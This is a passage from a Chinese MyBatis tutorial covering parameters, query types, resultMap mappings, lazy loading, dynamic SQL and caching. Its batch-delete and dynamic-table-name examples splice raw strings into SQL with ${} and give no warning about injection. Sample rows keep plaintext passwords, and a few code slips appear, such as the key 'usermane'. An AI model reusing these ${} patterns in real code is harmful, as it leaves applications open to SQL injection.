checkLoginByMap(Map<String,Object> map);-->\n<select id=\"checkLoginByMap\" resultType=\"User\">\n\tselect * from t_user where username = #{username} and password = #{password}\n</select>\n```\n\n```java\n@Test\npublic void checkLoginByMap() {\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n\tMap<String,Object> map = new HashMap<>();\n\tmap.put(\"usermane\",\"admin\");\n\tmap.put(\"password\",\"123456\");\n\tUser user = userMapper.checkLoginByMap(map);\n\tSystem.out.println(user);\n}\n```\n\n### 4.实体类类型的参数\n\n若mapper接口中的方法参数为实体类对象时此时可以使用`${}`和`#{}`，通过访问实体类对象中的属性名获取属性值\n\n```xml\n<!--int insertUser(User user);-->\n<insert id=\"insertUser\">\n\tinsert into t_user values(null,#{username},#{password},#{age},#{sex},#{email})\n</insert>\n```\n\n```java\n@Test\npublic void insertUser() {\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n\tUser user = new User(null,\"Tom\",\"123456\",12,\"男\",\"123@321.com\");\n\tuserMapper.insertUser(user);\n}\n```\n\n### 5.使用@Param标识参数\n\n可以通过@Param注解标识mapper接口中的方法参数，此时会将这些参数放在map集合中 \n\n- 以@Param注解的value属性值为键，以参数为值；\n\n- 以param1,param2...为键，以参数为值；\n\n只需要通过`${}`和`#{}`访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号\n\n```xml\n<!--User CheckLoginByParam(@Param(\"username\") String username, @Param(\"password\") String password);-->\n<select id=\"CheckLoginByParam\" resultType=\"User\">\n  select * from t_user where username = #{username} and password = #{password}\n</select>\n```\n```xml\n<!--User CheckLoginByParam(@Param(\"username\") String username, @Param(\"password\") String password);-->\n<select id=\"CheckLoginByParam\" resultType=\"User\">\n  select * from t_user where username = #{param1} and password = #{param2}\n</select>\n```\n\n```java\n@Test\npublic void checkLoginByParam() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tmapper.CheckLoginByParam(\"admin\",\"123456\");\n}\n```\n\n### 6.总结\n\n建议分成两种情况进行处理\n\n1. 实体类类型的参数\n2. 使用@Param标识参数\n\n## 六、MyBatis的各种查询功能\n\n1. 如果查询出的数据只有一条，可以通过\n\n- 1>实体类对象接收： `User`\n- 2>List集合接收： `List<User>`\n- 3>Map集合接收： `Map<String, Object>`\n\n2. 如果查询出的数据有多条，一定不能用实体类对象接收，会抛异常TooManyResultsException，可以通过\n\n- 1>实体类类型的List集合接收：`List<User>`\n- 2>Map类型的List集合接收：`List<Map<String, Object>>`\n- 3>在mapper接口的方法上添加@MapKey注解：`@MapKey(\"id\")`\n\n### 1.查询一个实体类对象\n\n```java\n//根据用户id查询用户信息\nUser getUserById(@Param(\"id\") int id);\n```\n\n```xml\n<!--User getUserById(@Param(\"id\") int id);-->\n<select id=\"getUserById\" resultType=\"User\">\n\tselect * from t_user where id = #{id}\n</select>\n```\n\n### 2.查询一个List集合\n\n```java\n//查询所有用户信息\nList<User> getUserList();\n```\n\n```xml\n<!--List<User> getUserList();-->\n<select id=\"getUserList\" resultType=\"User\">\n\tselect * from t_user\n</select>\n```\n\n### 3.查询单个数据\n\n```java\n// 查询用户的总记录数  \nint getCount();\n```\n\n```xml\n<!--int getCount();-->\n<select id=\"getCount\" resultType=\"integer\">\n\tselect count(id) from t_user\n</select>\n```\n\n### 4.查询一条数据为map集合\n\n```java\n//根据用户id查询用户信息为map集合    \nMap<String, Object> getUserToMap(@Param(\"id\") int id);\n```\n\n```xml\n<!--Map<String, Object> getUserToMap(@Param(\"id\") int id);-->\n<select id=\"getUserToMap\" resultType=\"map\">\n\tselect * from t_user where id = #{id}\n</select>\n<!--结果：{password=123456, sex=男, id=1, age=23, username=admin}-->\n```\n\n### 5.查询多条数据为map集合\n\n#### 方法一\n\n```java\n//查询所有用户信息为map集合\n//将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，此时可以将这些map放在一个list集合中获取\nList<Map<String, Object>> getAllUserToMap();\n```\n\n```xml\n<!--Map<String, Object> getAllUserToMap();-->  \n<select id=\"getAllUserToMap\" resultType=\"map\">  \n\tselect * from t_user  \n</select>\n<!--\n\t结果：\n\t[{password=123456, sex=男, id=1, age=23, username=admin},\n\t{password=123456, sex=男, id=2, age=23, username=张三},\n\t{password=123456, sex=男, id=3, age=23, username=张三}]\n-->\n```\n\n#### 方法二\n\n```java\n//查询所有用户信息为map集合\n//通过@MapKey注解设置map集合的键，值是每条数据所对应的map集合\n@MapKey(\"id\")\nMap<String, Object> getAllUserToMap();\n```\n\n```xml\n<!--Map<String, Object> getAllUserToMap();-->\n<select id=\"getAllUserToMap\" resultType=\"map\">\n\tselect * from t_user\n</select>\n<!--\n\t结果：\n\t{\n\t1={password=123456, sex=男, id=1, age=23, username=admin},\n\t2={password=123456, sex=男, id=2, age=23, username=张三},\n\t3={password=123456, sex=男, id=3, age=23, username=张三}\n\t}\n-->\n```\n\n## 七、特殊SQL的执行\n\n### 1.模糊查询\n\n```java\n//根据用户名进行模糊查询\nList<User> getUserByLike(@Param(\"fuzzy_name\") String username);\n```\n\n```xml\n<!--List<User> getUserByLike(@Param(\"fuzzy_name\") String username);-->\n<select id=\"getUserByLike\" resultType=\"User\">\n\t<!--select * from t_user where username like '%${fuzzy_name}%'-->  \n\t<!--select * from t_user where username like concat('%',#{fuzzy_name},'%')-->  \n\tselect * from t_user where username like \"%\"#{fuzzy_name}\"%\"<!--最常用-->  \n</select>\n```\n\n### 2.批量删除\n\n只能使用`${}`，如果使用`#{}`，则解析后的sql语句为`delete from t_user where id in ('1,2,3')`，这样是将`1,2,3`看做是一个整体，只有id为`1,2,3`的数据会被删除。正确的语句应该是`delete from t_user where id in (1,2,3)`，或者`delete from t_user where id in ('1','2','3')`\n\n```java\n//根据id批量删除\nint deleteMore(@Param(\"ids\") String ids);\n```\n\n```xml\n!--int deleteMore(@Param(\"ids\") String ids);-->\n<delete id=\"deleteMore\">\n\tdelete from t_user where id in (${ids})\n</delete>\n```\n\n```java\n@Test\npublic void deleteMore() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tint result = mapper.deleteMore(\"1,2,3,8\");\n\tSystem.out.println(result);\n}\n```\n\n### 3.动态设置表名\n\n只能使用`${}`，因为表名不能加单引号\n\n```java\n//查询指定表中的数据\nList<User> getUserByTable(@Param(\"tableName\") String tableName);\n```\n\n```xml\n<!--List<User> getUserByTable(@Param(\"tableName\") String tableName);-->\n<select id=\"getUserByTable\" resultType=\"User\">\n\tselect * from ${tableName}\n</select>\n```\n\n### 4.添加功能获取自增的主键\n\n例如：添加班级信息 ，获取新添加的班级的id  ，为班级分配学生，即将某学生的班级id修改为新添加的班级的id\n\n- t_clazz(clazz_id,clazz_name)  \n- t_student(student_id,student_name,clazz_id)  \n\n在mapper.xml中设置两个属性\n\n- useGeneratedKeys：设置使用自增的主键  \n- keyProperty：将自增的主键的值赋值给传输到映射文件中参数的某个属性，因为增删改有统一的返回值是受影响的行数，因此只能将获取的自增的主键放在传输的参数user对象的某个属性中\n\n```java\n//添加用户信息\nvoid insertUser(User user);\n```\n\n```xml\n<!--void insertUser(User user);-->\n<insert id=\"insertUser\" useGeneratedKeys=\"true\" keyProperty=\"id\">\n\tinsert into t_user values (null,#{username},#{password},#{age},#{sex},#{email})\n</insert>\n```\n\n```java\n@Test\npublic void insertUser() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\tUser user = new User(null, \"ton\", \"123\", 23, \"男\", \"123@321.com\");\n\tmapper.insertUser(user);\n\tSystem.out.println(user);\n}\n//输出：user{id=10, username='ton', password='123', age=23, sex='男', email='123@321.com'}，自增主键存放到了user的id属性中\n```\n\n## 八、自定义映射resultMap\n\n建立两张表，员工表t_emp，部门表t_dept\n\n```sql\nCREATE TABLE `t_emp` (\n  `eid` int(11) NOT NULL AUTO_INCREMENT,\n  `emp_name` varchar(20) DEFAULT NULL,\n  `age` int(11) DEFAULT NULL,\n  `sex` char(1) DEFAULT NULL,\n  `email` varchar(20) DEFAULT NULL,\n  `did` int(11) DEFAULT NULL,\n  PRIMARY KEY (`eid`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;\n```\n\n```sql\nCREATE TABLE `t_dept` (\n  `did` int(11) NOT NULL AUTO_INCREMENT,\n  `dept_name` varchar(20) DEFAULT NULL,\n  PRIMARY KEY (`did`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n```\n\n### 1.处理字段和属性的映射关系\n\n数据库字段一般采用下划线，Java属性一般采用驼峰，所以就会造成字段名和属性名不一致，导致映射不了，并不会报错，只是无法映射的字段会显示null\n\n#### a.通过字段别名解决\n\n```xml\n<!--List<Emp> getAllEmp();-->\n<select id=\"getAllEmp\" resultType=\"Emp\">\n  <!--select * from t_emp-->\n  select eid,emp_name empName,age,sex,email from t_emp  <!--设置emp_name别名empName-->\n</select>\n```\n\n```java\n@Test\npublic void testGetAllEmp(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    List<Emp> list = mapper.getAllEmp();\n    list.forEach(emp -> System.out.println(emp));\n}\n```\n\n#### b.通过核心配置解决\n\n```xml\n<settings>\n  <!--将表中字段的下划线自动转换为驼峰 emp_name：empName-->\n  <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n</settings>\n```\n\n```xml\n<!--List<Emp> getAllEmp();-->\n<select id=\"getAllEmp\" resultType=\"Emp\">\n  select * from t_emp\n</select>\n```\n\n#### c.通过resultMap解决\n\n若数据库表中字段名和实体类中的属性名不一致，则可以通过resultMap设置自定义映射\n\n> 注：部分字段名和属性名一致的属性可以不用映射\n\n```xml\n<resultMap id=\"empResultMap\" type=\"Emp\">\n    <id property=\"eid\" column=\"eid\"></id>\n    <result property=\"empName\" column=\"emp_name\"></result>\n    <result property=\"age\" column=\"age\"></result>\n    <result property=\"sex\" column=\"sex\"></result>\n    <result property=\"email\" column=\"email\"></result>\n</resultMap>\n<select id=\"getAllEmp\" resultMap=\"empResultMap\">\n  \tselect * from t_emp\n</select>\n```\n\nresultMap：设置自定义映射  \n\n- 属性：  \n  - id：表示自定义映射的唯一标识，不能重复\n   - type：查询的数据要映射的实体类的类型  \n- 子标签：  \n  - id：设置主键的映射关系  \n  - result：设置普通字段的映射关系  \n- 子标签属性：  \n  - property：设置映射关系中实体类中的属性名  \n  - column：设置映射关系中表中的字段名\n\n### 2.多对一映射处理\n\n>查询员工信息以及员工所对应的部门信息\n\n```java\npublic class Emp {  \n\tprivate Integer eid;  \n\tprivate String empName;  \n\tprivate Integer age;  \n\tprivate String sex;  \n\tprivate String email;  \n\tprivate Dept dept;\n\t//...构造器、get、set、toString方法\n}\n```\n\n#### a.级联方式处理映射关系\n\n```xml\n<resultMap id=\"empAndDeptResultMapOne\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<result property=\"dept.did\" column=\"did\"></result>\n\t<result property=\"dept.deptName\" column=\"dept_name\"></result>\n</resultMap>\n<!--Emp getEmpAndDept(@Param(\"eid\")Integer eid);-->\n<select id=\"getEmpAndDept\" resultMap=\"empAndDeptResultMapOne\">\n\tselect * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}\n</select>\n```\n\n#### b.association处理映射关系\n\n```xml\n<resultMap id=\"empAndDeptResultMapTwo\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\" javaType=\"Dept\">\n\t\t<id property=\"did\" column=\"did\"></id>\n\t\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t</association>\n</resultMap>\n<!--Emp getEmpAndDept(@Param(\"eid\")Integer eid);-->\n<select id=\"getEmpAndDept\" resultMap=\"empAndDeptResultMapTwo\">\n\tselect * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}\n</select>\n```\n\n- association：处理多对一的映射关系\n- property：需要处理多对的映射关系的属性名\n- javaType：该属性的类型\n\n#### c.分步查询\n\n##### step1. 查询员工信息\n\n```java\n//EmpMapper里的方法\n/**\n * 通过分步查询，员工及所对应的部门信息\n * 分步查询第一步：查询员工信息\n */\nEmp getEmpAndDeptByStepOne(@Param(\"eid\") Integer eid);\n```\n\n```xml\n<resultMap id=\"empAndDeptByStepResultMap\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\"\n\t\t\t\t select=\"com.jianjian.mapper.DeptMapper.getEmpAndDeptByStepTwo\" column=\"did\">  \n  </association>\n</resultMap>\n<!--Emp getEmpAndDeptByStepOne(@Param(\"eid\") Integer eid);-->\n<select id=\"getEmpAndDeptByStepOne\" resultMap=\"empAndDeptByStepResultMap\">\n\tselect * from t_emp where eid = #{eid}\n</select>\n```\n\n- select：设置分布查询的sql的唯一标识（namespace.sqlId或mapper接口的全类名.方法名）\n- column：设置分步查询的条件\n\n##### step2. 查询部门信息\n\n```java\n//DeptMapper里的方法\n/**\n * 通过分步查询，员工及所对应的部门信息\n * 分步查询第二步：通过did查询员工对应的部门信息\n */\nDept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);\n```\n\n```xml\n<!--此处的resultMap仅是处理字段和属性的映射关系-->\n<resultMap id=\"EmpAndDeptByStepTwoResultMap\" type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n</resultMap>\n<!--Dept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getEmpAndDeptByStepTwo\" resultMap=\"EmpAndDeptByStepTwoResultMap\">\n\tselect * from t_dept where did = #{did}\n</select>\n```\n\n```xml\n<!--核心配置文件中开启下划线自动转换为驼峰，可直接用resultType-->\n<!--Dept getEmpAndDeptByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getEmpAndDeptByStepTwo\" resultType=\"Dept\">\n  select * from t_dept where did = #{did}\n</select>\n```\n\n```java\n@Test\npublic void testGetEmpAndDeptByStep(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp empAndDeptByStepOne = mapper.getEmpAndDeptByStepOne(4);\n    System.out.println(\"empAndDeptByStepOne = \" + empAndDeptByStepOne);\n}\n```\n\n### 3.一对多映射处理\n\n> 查询部门以及所对应的员工信息\n\n```java\npublic class Dept {\n    private Integer did;\n    private String deptName;\n    private List<Emp> emps;\n\t  //...构造器、get、set、toString方法\n}\n```\n\n#### a.collection\n\ncollection：用来处理一对多的映射关系\n\n- property：需要处理多对的映射关系的属性名\n- ofType：表示该属性对应的集合中存储的数据的类型\n\n```xml\n<resultMap id=\"DeptAndEmpResultMap\" type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t<collection property=\"emps\" ofType=\"Emp\">\n\t\t<id property=\"eid\" column=\"eid\"></id>\n\t\t<result property=\"empName\" column=\"emp_name\"></result>\n\t\t<result property=\"age\" column=\"age\"></result>\n\t\t<result property=\"sex\" column=\"sex\"></result>\n\t\t<result property=\"email\" column=\"email\"></result>\n\t</collection>\n</resultMap>\n<!--Dept getDeptAndEmp(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmp\" resultMap=\"DeptAndEmpResultMap\">\n\tselect * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did}\n</select>\n```\n\n```java\n @Test\npublic void testGetEmpAndDept2(){\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    DeptMapper mapper = sqlSession.getMapper(DeptMapper.class);\n    Dept deptAndEmp = mapper.getDeptAndEmp(3);\n    System.out.println(\"deptAndEmp = \" + deptAndEmp);\n}\n```\n\n####  b.分步查询\n\n#####  step1. 查询部门信息\n\n```java\n/**\n * 通过分步查询，查询部门及对应的所有员工信息\n * 分步查询第一步：查询部门信息\n */\nDept getDeptAndEmpByStepOne(@Param(\"did\") Integer did);\n```\n\n```xml\n<resultMap id=\"DeptAndEmpByStepOneResultMap\" type=\"Dept\">\n\t<id property=\"did\" column=\"did\"></id>\n\t<result property=\"deptName\" column=\"dept_name\"></result>\n\t<collection property=\"emps\"\n\t\t\t\tselect=\"com.jianjian.mapper.EmpMapper.getDeptAndEmpByStepTwo\" column=\"did\">\n  </collection>\n</resultMap>\n<!--Dept getDeptAndEmpByStepOne(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmpByStepOne\" resultMap=\"DeptAndEmpByStepOneResultMap\">\n\tselect * from t_dept where did = #{did}\n</select>\n```\n\n##### step2. 根据部门id查询部门中的所有员工\n\n```java\n/**\n * 通过分步查询，查询部门及对应的所有员工信息\n * 分步查询第二步：根据部门id查询部门中的所有员工\n */\nList<Emp> getDeptAndEmpByStepTwo(@Param(\"did\") Integer did);\n```\n\n```xml\n<!--List<Emp> getDeptAndEmpByStepTwo(@Param(\"did\") Integer did);-->\n<select id=\"getDeptAndEmpByStepTwo\" resultType=\"Emp\">\n\tselect * from t_emp where did = #{did}\n</select>\n```\n\n### 4.延迟加载\n\n- lazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载  \n\n- aggressiveLazyLoading：要实现延迟加载需设置为false，默认值为false\n\n  - 当开启时，任何方法的调用都会加载该对象的所有属性\n\n  - 否则，每个属性会按需加载  \n\n分步查询的优点：可以实现延迟加载，但是必须在核心配置文件中设置全局配置信息：\n\n```xml\n<settings>\n  <!--开启延迟加载-->\n  <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n</settings>\n\n<!--此时就可以实现按需加载，获取的数据是什么，就只会执行相应的sql-->\n```\n\n```java\n@Test\npublic void getEmpAndDeptByStepOne() {\n\tSqlSession sqlSession = SqlSessionUtils.getSqlSession();\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\tEmp emp = mapper.getEmpAndDeptByStepOne(1);\n\tSystem.out.println(emp.getEmpName());\n}\n```\n\n- 开启延迟加载，只运行获取emp的SQL语句\n\n![](https://img.jwt1399.top/img/202205241959248.png)\n\n- 关闭延迟加载，两条SQL语句都运行了\n\n![](https://img.jwt1399.top/img/202205241959995.png)\n\n```java\n@Test\npublic void getEmpAndDeptByStepOne() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp emp = mapper.getEmpAndDeptByStepOne(1);\n    System.out.println(emp.getEmpName());\n    System.out.println(\"----------------\");\n    System.out.println(emp.getDept());\n}\n```\n\n- 开启延迟加载，需要用到查询dept的时候才会调用相应的SQL语句\n\n![](https://img.jwt1399.top/img/202205241959629.png)\n\n- 关闭延迟加载，SQL语句会先直接全部执行，再获取数据\n\n![](https://img.jwt1399.top/img/202205241959150.png)\n\n有的功能不想设置延迟加载，可通过association和collection中的fetchType属性手动设置当前的分步查询延迟加载效果\n\n- fetchType=\"lazy\"    (延迟加载)\n- fetchType=\"eager\"  (立即加载)\n\n```xml\n<resultMap id=\"empAndDeptByStepResultMap\" type=\"Emp\">\n\t<id property=\"eid\" column=\"eid\"></id>\n\t<result property=\"empName\" column=\"emp_name\"></result>\n\t<result property=\"age\" column=\"age\"></result>\n\t<result property=\"sex\" column=\"sex\"></result>\n\t<result property=\"email\" column=\"email\"></result>\n\t<association property=\"dept\"\n\t\t\t\t select=\"com.jianjian.mapper.DeptMapper.getEmpAndDeptByStepTwo\"\n\t\t\t\t column=\"did\"\n\t\t\t\t fetchType=\"eager\">\n  </association>\n</resultMap>\n```\n\n## 九、动态SQL\n\nMybatis框架的动态SQL技术是一种根据特定条件动态拼装SQL语句的功能，它存在的意义是为了解决拼接SQL语句字符串时的痛点问题\n\n### 1.if\n\nif标签可通过test属性（即传递过来的数据）的表达式进行判断，若表达式的结果为true，则标签中的内容会执行；反之标签中的内容不会执行\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp where 1=1\n\t<if test=\"empName != null and empName !=''\">\n\t\tand emp_name = #{empName}\n\t</if>\n\t<if test=\"age != null and age !=''\">\n\t\tand age = #{age}\n\t</if>\n\t<if test=\"sex != null and sex !=''\">\n\t\tand sex = #{sex}\n\t</if>\n\t<if test=\"email != null and email !=''\">\n\t\tand email = #{email}\n\t</if>\n</select>\n```\n\n```java\n@Test\npublic void testGetEmpByCondition(){\n  SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n  EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n  List<Emp> empByCondition = mapper.getEmpByCondition(new Emp(null,\"张三\",null,null,null));\n  System.out.println(\"empByCondition = \" + empByCondition);\n}\n```\n\n在where后面添加一个恒成立条件`1=1`，这个恒成立条件并不会影响查询的结果，这个`1=1`可以用来拼接`and`语句，例如：当empName为null时\n\n- 如果不加上恒成立条件，则SQL语句为`select * from t_emp where and age = ? and sex = ? and email = ?`，此时`where`会与`and`连用，SQL语句会报错\n- 如果加上一个恒成立条件，则SQL语句为`select * from t_emp where 1= 1 and age = ? and sex = ? and email = ?`，此时不报错\n\n### 2.where\n\nwhere和if一般结合使用\n\n- 若where标签中的if条件都不满足，则where标签没有任何功能，即不会添加where关键字  \n- 若where标签中的if条件满足，则where标签会自动添加where关键字，并将条件最前方多余的and/or去掉\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<where>\n\t\t<if test=\"empName != null and empName !=''\">\n\t\t\temp_name = #{empName}\n\t\t</if>\n\t\t<if test=\"age != null and age !=''\">\n\t\t\tand age = #{age}\n\t\t</if>\n\t\t<if test=\"sex != null and sex !=''\">\n\t\t\tand sex = #{sex}\n\t\t</if>\n\t\t<if test=\"email != null and email !=''\">\n\t\t\tand email = #{email}\n\t\t</if>\n\t</where>\n</select>\n```\n\n注意：where标签不能去掉条件后多余的and/or\n\n```xml\n<!--这种用法是错误的，只能去掉条件前面的and/or，条件后面的不行-->\n<where>\n  <if test=\"empName != null and empName !=''\">\n    emp_name = #{empName} and\n  </if>\n  <if test=\"age != null and age !=''\">\n    age = #{age}\n  </if>\n</where>\n```\n\n### 3.trim\n\ntrim用于去掉或添加标签中的内容  \n\n- prefix：在trim标签中的内容的前面添加某些内容  \n- suffix：在trim标签中的内容的后面添加某些内容 \n- prefixOverrides：在trim标签中的内容的前面去掉某些内容  \n- suffixOverrides：在trim标签中的内容的后面去掉某些内容\n\n若trim中的标签都不满足条件，则trim标签没有任何效果，也就是只剩下`select * from t_emp`\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<trim prefix=\"where\" suffixOverrides=\"and|or\">\n\t\t<if test=\"empName != null and empName !=''\">\n\t\t\temp_name = #{empName} and\n\t\t</if>\n\t\t<if test=\"age != null and age !=''\">\n\t\t\tage = #{age} and\n\t\t</if>\n\t\t<if test=\"sex != null and sex !=''\">\n\t\t\tsex = #{sex} or\n\t\t</if>\n\t\t<if test=\"email != null and email !=''\">\n\t\t\temail = #{email}\n\t\t</if>\n\t</trim>\n</select>\n```\n\n### 4.choose、when、otherwise\n\n- choose、when、otherwise 相当于 if...else if...else\n- when 至少要有一个，otherwise 至多只有一个\n\n```xml\n<!--List<Emp> getEmpListByChoose(Emp emp);-->\n<select id=\"getEmpByChoose\" resultType=\"Emp\">\n\tselect * from t_emp\n\t<where>\n\t\t<choose>\n\t\t\t<when test=\"empName != null and empName != ''\">\n\t\t\t\temp_name = #{empName}\n\t\t\t</when>\n\t\t\t<when test=\"age != null and age != ''\">\n\t\t\t\tage = #{age}\n\t\t\t</when>\n\t\t\t<when test=\"sex != null and sex != ''\">\n\t\t\t\tsex = #{sex}\n\t\t\t</when>\n\t\t\t<otherwise>\n\t\t\t\tdid = 1\n\t\t\t</otherwise>\n\t\t</choose>\n\t</where>\n</select>\n```\n\n相当于`if a else if b else if c else d`，只会执行其中一个\n\n### 5.foreach\n\n对集合进行遍历\n\n属性：  \n\n- collection：设置要循环的数组或集合  \n- item：表示集合或数组中的每一个数据  \n- separator：设置循环体之间的分隔符，分隔符前后默认有一个空格，如` , `\n- open：设置foreach标签中的内容的开始符  \n- close：设置foreach标签中的内容的结束符\n\n批量删除\n\n```xml\n<!--int deleteMoreByArray(@Param(\"eids\") Integer[] eids);-->\n<delete id=\"deleteMoreByArray\">\n\tdelete from t_emp where eid in\n\t<foreach collection=\"eids\" item=\"eid\" separator=\",\" open=\"(\" close=\")\">\n\t\t#{eid}\n\t</foreach>\n</delete>\n```\n```java\n@Test\npublic void deleteMoreByArray() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    int result = mapper.deleteMoreByArray(new Integer[]{1,2,3});\n    System.out.println(result);\n}\n```\n\n批量添加\n\n```xml\n<!--int insertMoreByList(@Param(\"emps\") List<Emp> emps);-->\n<insert id=\"insertMoreByList\">\n\tinsert into t_emp values\n\t<foreach collection=\"emps\" item=\"emp\" separator=\",\">\n\t\t(null,#{emp.empName},#{emp.age},#{emp.sex},#{emp.email})\n\t</foreach>\n</insert>\n```\n```java\n@Test\npublic void insertMoreByList() {\n    SqlSession sqlSession = SqlSessionUtils.getSqlSession();\n    EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n    Emp emp1 = new Emp(null,\"a\",1,\"男\",\"123@321.com\");\n    Emp emp2 = new Emp(null,\"b\",1,\"男\",\"123@321.com\");\n    Emp emp3 = new Emp(null,\"c\",1,\"男\",\"123@321.com\");\n    List<Emp> emps = Arrays.asList(emp1, emp2, emp3);\n    int result = mapper.insertMoreByList(emps);\n    System.out.println(result);\n}\n```\n\n### 6.sql\n\nsql语句可以记录一段公共sql片段，在使用的地方通过include标签进行引入\n\n- 声明sql片段：`<sql>`标签\n\n```xml\n<sql id=\"empColumns\">eid,emp_name,age,sex,email</sql>\n```\n\n- 引用sql片段：`<include>`标签\n\n```xml\n<!--List<Emp> getEmpByCondition(Emp emp);-->\n<select id=\"getEmpByCondition\" resultType=\"Emp\">\n\tselect <include refid=\"empColumns\"></include> from t_emp\n</select>\n```\n\n## 十、MyBatis的缓存\n\n### 1.一级缓存\n\n一级缓存是**SqlSession级别**的，通过同一个SqlSession查询的数据会被缓存，下次查询相同的数据，就会从缓存中直接获取，不会从数据库重新访问  \n\n一级缓存失效的四种情况：  \n\n1. 不同的SqlSession对应不同的一级缓存  \n2. 同一个SqlSession但是查询条件不同\n3. 同一个SqlSession两次查询期间执行了任何一次增删改操作\n4. 同一个SqlSession两次查询期间手动清空了缓存 `sqlSession.clearCache();`\n\n### 2.二级缓存\n\n二级缓存是**SqlSessionFactory级别**，通过同一个SqlSessionFactory创建的SqlSession查询的结果会被缓存；此后若再次执行相同的查询语句，结果就会从缓存中获取  \n\n**二级缓存开启的条件**：\n\n1. 在核心配置文件中，设置全局配置属性cacheEnabled=\"true\"，默认为true，不需要设置\n2. 在mapper映射文件中设置标签`<cache />`\n3. 二级缓存必须在SqlSession关闭或提交之后有效\n   1. `sqlSession.close();`\n   2. `sqlSession.commit();`\n4. 查询的数据所转换的实体类类型必须实现序列化的接口\n\n**二级缓存失效的情况**：两次查询之间执行了任意的增删改，会使一级和二级缓存同时失效\n\n**二级缓存的相关配置**\n\n在mapper配置文件中添加的cache标签可以设置一些属性\n\n- eviction属性：缓存回收策略  \n  - LRU（Least Recently Used） – 最近最少使用的：移除最长时间不被使用的对象。  默认值\n  - FIFO（First in First out） – 先进先出：按对象进入缓存的顺序来移除它们。  \n  - SOFT – 软引用：移除基于垃圾回收器状态和软引用规则的对象。  \n  - WEAK – 弱引用：更积极地移除基于垃圾收集器状态和弱引用规则的对象。\n- flushInterval属性：刷新间隔，单位毫秒。默认情况是不设置，也就是没有刷新间隔，缓存仅仅调用语句（增删改）时刷新\n- size属性：引用数目，正整数。代表缓存最多可以存储多少个对象，太大容易导致内存溢出\n- readOnly属性：只读，true/false\n  - true：只读缓存；会给所有调用者返回缓存对象的相同实例。因此这些对象不能被修改。这提供了很重要的性能优势。  \n  - false：读写缓存；会返回缓存对象的拷贝（通过序列化）。这会慢一些，但是安全，因此默认是false\n\n### 3.缓存查询顺序\n\n- 先查询二级缓存，因为二级缓存中可能会有其他程序已经查出来的数据，可以拿来直接使用  \n- 如果二级缓存没有命中，再查询一级缓存  \n- 如果一级缓存也没有命中，则查询数据库  \n- SqlSession关闭之后，一级缓存中的数据会写入二级缓存\n\n### 4.三方缓存EHCache\n\n#### a .添加依赖\n\n```xml\n<!-- Mybatis EHCache整合包 